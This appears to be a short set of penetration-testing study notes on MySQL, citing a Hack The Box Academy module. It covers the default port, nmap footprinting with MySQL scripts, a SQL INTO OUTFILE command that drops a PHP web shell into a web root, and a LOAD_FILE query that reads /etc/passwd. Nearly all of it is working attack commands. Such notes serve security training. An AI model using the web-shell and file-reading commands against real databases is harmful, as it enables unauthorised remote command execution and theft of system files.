MySQL
########

Date: 2024-11-11 10:38

Status:

Mysql Ports
*************

Commonly the port 3306 is used by default

MySQL Footprinting
********************

Example 1: Using nmap with the mysql scripts

.. code-block:: console

   sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*

MySQL Dropping shells and writing files
****************************************

Using the OUTFILE option to place shells.

example 1: Dropping a PHP shell

.. code-block:: console

   SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Mysql Reading files
*********************

.. code-block:: console

   select LOAD_FILE("/etc/passwd");

References
************
https://academy.hackthebox.com/module/112/section/1238
